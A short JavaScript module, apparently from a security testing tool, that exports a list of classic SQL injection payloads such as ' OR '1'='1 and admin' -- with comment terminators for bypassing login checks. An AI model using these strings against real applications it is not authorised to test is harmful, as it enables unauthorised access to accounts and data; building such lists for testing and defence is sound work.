// utils/payloads.js
export const SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR '1'='1' /*",
  ];